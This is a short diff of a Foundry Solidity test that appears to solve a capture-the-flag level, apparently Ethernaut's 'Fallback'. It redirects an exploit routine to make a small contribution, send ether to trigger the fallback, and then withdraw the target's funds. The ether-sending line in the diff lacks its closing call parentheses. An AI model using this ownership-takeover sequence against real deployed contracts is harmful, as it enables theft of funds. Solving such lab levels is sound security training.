@@ -17,9 +17,9 @@ contract FallbackTest is Test {
     function exploit() internal {
         vm.startPrank(student);
 
-        this.contribute{value: 0.0001 ether}();
-        address(this).call{value: 0.02 ether};
-        this.withdraw();
+        fallbackContract.contribute{value: 0.0001 ether}();
+        address(fallbackContract).call{value: 0.02 ether};
+        fallbackContract.withdraw();
 
         vm.stopPrank();
     }
